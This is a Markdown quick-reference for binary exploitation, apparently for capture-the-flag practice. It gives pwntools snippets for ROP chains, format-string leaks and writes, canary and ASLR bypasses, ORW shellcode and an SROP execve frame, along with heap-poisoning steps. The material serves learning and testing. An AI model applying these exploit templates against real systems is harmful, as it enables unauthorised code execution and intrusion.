# Pwn

Binary exploitation reminders and quick references.

## Quick wins
- Check protections first: RELRO, canary, NX, PIE, file descriptors
- Identify the libc version/offsets early to avoid wrong gadgets
- For restricted shellcode (alphanumeric), use dedicated encoders
- Use `one_gadget` to find magic gadgets in libc

## Protections cheatsheet

| Protection | Disabled | Exploitation |
|------------|----------|--------------|
| RELRO | Partial/None | GOT overwrite possible |
| Canary | No canary | Stack smashing viable |
| NX | Disabled | Shellcode on stack executable |
| PIE | No PIE | Addresses static, hardcode PLT/GOT |

```bash
# Check binary protections
checksec --file=./binary
```

## ROP Chains

### Finding gadgets
```bash
# ROPgadget
ROPgadget --binary ./binary --ropchain

# ropper
ropper --file ./binary --search "pop rdi"

# one_gadget (magic gadgets in libc)
one_gadget ./libc.so.6
```

### pwntools ROP
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Build chain
rop.call('puts', [elf.got.puts])
rop.call('main')
payload = flat({offset: rop.chain()})
```

## Format String

### Leaking values
```python
# Leak stack values
for i in range(1, 20):
    payload = f"%{i}$p"
    # Send and check output
```

### Writing values
```python
from pwn import *

# Using fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value}, numbwritten=0)

# Manual write (write 2 bytes at a time)
writes = {addr: val & 0xffff, addr+2: (val >> 16) & 0xffff}
```

## Heap Exploitation

### tcache poisoning (glibc 2.27+)
```
1. Allocate chunk A and chunk B
2. Free B, then free A
3. Overwrite A's fd pointer (use-after-free)
4. Allocate twice - second allocation at arbitrary address
```

### Common heap techniques
- **Use-After-Free**: Access freed memory
- **Double Free**: Free same chunk twice for tcache poisoning
- **Heap Overflow**: Overwrite adjacent chunk metadata
- **House of Force**: Overwrite top chunk size for arbitrary allocation

## Stack Canary Bypass

```python
# Leak canary with format string
payload = b"%17$p"  # Adjust offset for your binary

# Brute force (forking server)
for byte in range(256):
    # Send partial overflow with guessed byte
    # Check if crash occurs
```

## ASLR/PIE Bypass

### Information leaks
```python
# Leak libc address from GOT
rop.call('puts', [elf.got.puts])
libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts
```

### Partial overwrite
- Only overwrite low bytes (12 bits fixed due to page alignment)
- 1/16 chance for 4-bit guess

## Seccomp Bypass

```bash
# Dump seccomp rules
seccomp-tools dump ./binary
```

### ORW (open-read-write) shellcode
```python
from pwn import *

# When execve is blocked
shellcode = shellcraft.open('flag.txt')
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
```

## SROP (Sigreturn-Oriented Programming)

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b'A' * offset + p64(mov_rax_15) + p64(syscall) + bytes(frame)
```

## Useful Commands

```bash
# Find offset to return address
cyclic 200
# After crash, check RSP value
cyclic -l <value>

# Find string in binary
strings -t x ./binary | grep "flag"

# Find functions
objdump -t ./binary | grep "win"

# Find RWX sections
readelf -l ./binary | grep -A1 LOAD
```

## References
- Syscall tables: https://x64.syscall.sh/, https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
- Libc offsets: https://libc.blukat.me/, https://libc.rip/
- Alphanumeric shellcode encoders: https://github.com/TaQini/alpha3, https://github.com/SkyLined/alpha3/tree/master
- Exploit library repo: https://github.com/TheFlash2k/flashlib/tree/main
- One gadget: https://github.com/david942j/one_gadget
- pwntools docs: https://docs.pwntools.com/
